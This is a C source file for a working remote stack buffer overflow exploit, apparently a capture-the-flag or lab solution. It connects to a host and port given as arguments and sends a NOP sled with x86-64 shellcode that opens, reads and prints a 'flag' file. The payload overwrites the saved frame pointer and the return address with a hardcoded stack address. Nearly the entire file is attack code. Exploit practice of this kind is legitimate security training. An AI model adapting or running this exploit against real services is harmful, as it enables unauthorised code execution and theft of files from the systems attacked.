#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>

int main(int argc, char **argv) {
	if (argc != 3) {
        fprintf(stderr, "Not enough arguments.\n");
        return 1;
    }

    int rc, fd = -1;
    ssize_t size;
    char buf[1024];
    buf[1023] = '\0';
    struct addrinfo hints = { .ai_socktype = SOCK_STREAM };
    struct addrinfo *info = NULL, *p;
    int exit_code = EXIT_FAILURE;

    char filename_buf[20];
    filename_buf[19] = '\0';

    // lookup service
    rc = getaddrinfo(argv[1], argv[2], &hints, &info);
    if (0 != rc) {
        fprintf(stderr, "error looking up %s\n", argv[1]);
        goto done;
    }

    // connect to service
    for (p = info; p; p = p->ai_next) {
        fd = socket(p->ai_family, p->ai_socktype, 0);
        if (-1 == fd) {
            continue;
        }

        rc = connect(fd, p->ai_addr, p->ai_addrlen);
        if (rc > -1) {
            break;
        }
    }

    // read bytes from service 
    for (;;) {
        size = recv(fd, filename_buf, sizeof(filename_buf), 0);
        if (0 == size) {
            break;
        } else if (size > 0) {
            printf("%s", filename_buf);
            break;
        } else {
            perror("error reading from connection");
            goto done;
        }
    }
    char buffer[2065];

    char shell_code[] =
"\x48\xc7\xc0\x02\x00\x00\x00" // mov 2 rax
"\x48\x8d\x3c\x25\xa0\x51\x40\x00" // lea flag
"\x48\xc7\xc6\x00\x00\x00\x00" // mov 0 rsi
"\x0f\x05" // sys
"\x48\x89\xc7" // mov rax rdi
"\x48\xc7\xc0\x00\x00\x00\x00" // mov 0 rax
"\x48\xbe\x4c\xe0\xff\xff\xff\x7f\x00\x00" // mov $0x7fffffffe04c, %rsi
"\x48\xc7\xc2\x64\x00\x00\x00" // mov 100 rdx
"\x0f\x05" // sys
"\x48\xc7\xc0\x01\x00\x00\x00" // mov 1 rax
"\x48\xc7\xc7\x01\x00\x00\x00" // mov 1 rdi
"\x48\xbe\x4c\xe0\xff\xff\xff\x7f\x00\x00" // mov $0x7fffffffe04c, %rsi
"\x48\xc7\xc2\x64\x00\x00\x00" // mov 100 rdx
"\x0f\x05" // sys
"\x48\x31\xff" // xorq rdi rdi
"\x48\xc7\xc0\x3c\x00\x00\x00" // mov 60 rax
"\x0f\x05" // sys
    ;

    char ret_addr[] = "\x90\xe7\xff\xff\xff\x7f\x00\x00";
    
    // fill buffer with nop's
    memset(buffer, '\x90', 2048);

    //put shell code at end of buffer
    memcpy(buffer + (2048 - sizeof(shell_code)), shell_code, sizeof(shell_code));

    // overwrite RBP
    memset(buffer + 2048, 'B', 8);

    // overwrite ret addr
    memcpy(buffer + 2056, ret_addr, 8);
    memcpy(buffer + 2064, "\n", 1);

    // send data
    ssize_t bytes_sent = send(fd, buffer, sizeof(buffer), 0);
    if (bytes_sent == -1) {
        perror("Send failed");
        goto done;
    }

    // receive the file contents
    for (;;) {
        size = recv(fd, buf, sizeof(buf), 0);
        if (0 == size) {
            break;
        } else if (size > 0) {
            printf("%s\n", buf);
            break;
        } else {
            perror("error reading from connection");
            goto done;
        }
    }
        
    // exit
    exit_code = EXIT_SUCCESS;

done:
    if (fd != -1) {
        close(fd);
    }

    exit(exit_code);

    return 0;
}
